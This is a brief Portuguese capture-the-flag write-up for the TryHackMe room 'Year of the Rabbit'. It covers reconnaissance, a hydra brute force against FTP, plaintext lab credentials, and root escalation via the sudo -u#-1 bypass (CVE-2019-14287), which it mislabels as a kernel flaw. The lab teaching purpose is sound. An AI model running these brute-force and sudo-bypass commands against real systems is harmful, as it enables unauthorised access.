#ctf
# Year of the Rabbit
https://tryhackme.com/room/yearoftherabbit

## Identificando alvo
Rodando NMAP em todas as portas:

        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 3.0.2
        22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.10 ((Debian))

Existe um arquivo http://10.10.22.61/sup3r_s3cr3t_fl4g.php que ao acessar o cabeçalho da resposta possui isso "intermediary.php?hidden_directory=/WExYY2Cv-qU"

Acessando a url http://10.10.22.61/WExYY2Cv-qU/ existe uma imagem que olhando seu hexadecimal possui o usuario ftp (ftpuser) e uma lista de senhas

Rodando o bruteforce:

```sh
hydra -l ftpuser -P hash.txt <IP> ftp
```
ftpuser:5iez1wGXKfPKQ

No serviço FTP existe um .txt criptografado (brainfuck). Ao decriptografar temos o usuario eli:DSpDiM1wAEwid para acessar o ssh.

## Privesc
Ao logar existe um banner dizendo de um arquivo s3cr3t escondido, então rodando:

```sh
find / -name s3cr3t 2>/dev/null
cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```
gwendoline:MniVCQVhQHUNI

Dando um *sudo -l* é possível ver os comandos que o usuario consegue rodar sem precisar da senha

        (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

O kernel do sistema é vulneravel a esta falha [2019-14287](https://www.exploit-db.com/exploits/47502). Então rodando

```sh
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
:!/bin/bash
```
GG
